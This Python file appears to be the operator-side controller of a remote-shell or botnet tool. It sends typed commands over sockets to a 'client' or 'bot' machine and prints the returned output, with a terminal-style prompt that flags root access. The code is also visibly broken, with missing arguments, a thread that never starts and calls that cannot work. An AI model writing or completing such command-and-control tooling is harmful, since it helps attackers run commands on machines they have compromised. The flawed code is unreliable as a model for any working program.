import socket 
import threading 
import time

icon = """
█▀█ █▀█ ▀▀▀█ 
░▄▀ ░▄▀ ░░█░ 
█▄▄ █▄▄ ░▐▌░
"""

class Server:
    def __init__(self, client_ip: str):
       self.client_ip = client_ip
       self.pwd = ''
       self.machine_ip = ''
       self.user = ''

       # Initializing the socket to send commands
       self.sending_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       self.sending_socket.connect((self.client_ip, 5000))

       # Initializing the socket to receive outputs
       self.reception_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       self.reception_socket.bind(('localhost', 5001))

       # Starting the error managing thread
       self.error_thread = threading.Thread(target=self.listenErrors)
       self.error_thread.start()

       threading.Thread(target=self.listen_for_client)

    def listen_for_client(self):
        self.reception_socket.listen()
        client_socket, address = self.reception_socket.accept()

        # Queue
        while len(threading.enumerate()) > 2:
            client_socket.send(f'There are {len(threading.enumerate()) - 1} clients ahead of you. Refresh in 30sec'.encode('utf-8'))
            time.sleep(30)

        while True:
            client_socket.settimeout(60)
            self.manage_connection(client_socket, address)

    def manage_connection(self, client_socket: socket.socket, address: str):
        pwd, machine_ip, user = client_socket.recv(8192).decode()
        self.pwd, self.machine_ip, self.user = pwd, machine_ip, user
        self.send_command()
        output: str = client_socket.recv(8192).decode()
        self.display_output(output)

    def display(self):
        # Function to simulate the terminal
        prefix: str = ''

        if self.user != 'root':
            prefix = '~'
            prompt = f"[{self.pwd}][{self.machine_ip}]{prefix}"
            return prompt 
        prefix = '#'
        prompt = f"[{self.pwd}][{self.machine_ip}]{prefix}"
        return prompt

    def display_output(output: str):
        print(output)

    def listenErrors(self):
        # Function to deal with bots errors
        receiving_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        receiving_socket.bind((socket.gethostname(), 5001))
        receiving_socket.listen()
        
        print(receiving_socket.recv(8192).decode())

        for thread in threading.enumerate():
            thread.kill()

    def get_command(self):
        # Function to receive the wanted command
        command = input(self.display())
        return command 
    
    def send_command(self, send_socket: socket.socket):
        # Function to send commands to client
        command = self.get_command()
        send_socket.send(command.encode('utf-8')) 
